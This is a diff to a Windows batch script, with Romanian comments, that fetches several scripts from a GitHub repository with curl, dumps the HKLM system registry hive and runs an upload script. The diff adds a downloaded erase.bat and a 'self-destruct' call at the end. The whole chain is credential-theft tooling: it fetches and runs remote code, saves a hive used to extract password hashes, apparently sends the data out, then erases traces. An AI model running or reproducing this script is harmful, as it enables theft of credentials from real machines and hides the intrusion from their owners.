@@ -12,6 +12,7 @@ curl -s https://raw.githubusercontent.com/Voltex-XD/batchfile/refs/heads/main/sc
 curl -s https://raw.githubusercontent.com/Voltex-XD/batchfile/refs/heads/main/script1/install.bat > "install.bat"
 curl -s https://raw.githubusercontent.com/Voltex-XD/batchfile/refs/heads/main/script1/intialize.ps1 > "initialize.ps1"
 curl -s https://raw.githubusercontent.com/Voltex-XD/batchfile/refs/heads/main/script1/upload.py > "upload.py"
+curl -s https://raw.githubusercontent.com/Voltex-XD/batchfile/refs/heads/main/script1/erase.bat > "erase.bat"
 
 REM Verifică dacă initialize.ps1 a fost descărcat corect
 findstr /i "404" initialize.ps1 >nul
@@ -33,5 +34,8 @@ powershell -Command "reg save HKLM\system .\system.save"
 
 REM Rulează scriptul Python
 py upload.py
+
+REM Self-destruct operation
+call erase.bat
 
 pause
